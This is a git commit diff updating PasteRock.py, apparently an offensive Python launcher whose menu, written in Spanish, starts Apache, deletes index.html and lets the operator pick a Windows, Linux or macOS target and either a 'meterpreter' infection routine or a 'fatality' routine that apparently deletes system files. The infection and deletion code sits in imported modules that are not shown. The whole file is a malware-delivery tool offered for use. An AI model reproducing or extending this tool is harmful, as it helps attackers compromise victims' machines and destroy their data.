c22572e7b2ee77434205dff7d8c546551162858a
SpyRock <andresmontoyafcb@gmail.com>
2016-07-11 13:19:14 -0500

    Update PasteRock.py

--- PasteRock.py
+++ PasteRock.py
@@ -3,55 +3,62 @@
 import os
 from linux import *
 from windows import *
-from osx import osxinfect
+from osx import *
+from colores import *
 
-print chr(27)+"[3;36m"+"""
+print bcolors.BOLD+"""
 [---]        		   PastRock                    [---]
 [---]        Created by: Andrés Montoya (SpyRock)      [---]
-[---]                    Version: 0.3                  [---]
+[---]                    Version: 0.4                  [---]
 [---]         		  SpyRock SEC         	       [---]
 [---]        Sigueme en Facebook: SpyRock SEC          [---]
 [---]        Google plus: Andrés Montoya               [---]    
 [---]       Homepage: http://spyrockos.aegae.com       [---]
 
-              Visit: http://spyrockos.aegae.com
-"""
-print "[x]apache2 start..."
+              Visit: http://spyrockos.aegae.com"""
+
+print bcolors.apache+"[x]apache2 start..."
 
 os.system("service apache2 start")
 
-print "[:)]apache esta corriendo!"
+print bcolors.apache+"[:)]apache esta corriendo!"
 
-print "[*]Limpiando..."
+print bcolors.FAIL+"[*]Limpiando..."
 
 os.system("rm index.html")
 
-plataforma=int(raw_input("""
+print bcolors.FAIL+"""
 Eliga plataforma
 
 [1]Windows
 [2]Linux
 [3]MAC OSX (Pronto)
+"""
 
-plataforma: """))
+plataforma=int(raw_input(bcolors.payload+"Paste" + bcolors.WARNING + "Rock"+ bcolors.OKBLUE +": "))
 
 if (plataforma == 1):
 	g=raw_input("eliga (meterpreter/fatality) ")
 	if g == "meterpreter":
-		windowsinfect()
+		g=windows()
+		g.windowsinfect()
 	elif g == "fatality":
-		system32()
+		g=windowsrm()
+		g.system32()
 	else:
 		print "error"
 elif (plataforma == 2):
 	f=raw_input("eliga (meterpreter/fatality) ")
 	if f == "meterpreter":
-		linuxinfect()
+		f=linux()
+		f.linuxinfect()
 	elif f == "fatality":
-		linuxrm()
+		f=LinuxDelete()
+		f.linuxrm()
 	else:
 		print "error"
 elif (plataforma == 3):
-	osxinfect()
+	e=osx()
+	e.osxinfect
 else:
 	print "A la proxima, escribe lo que es."
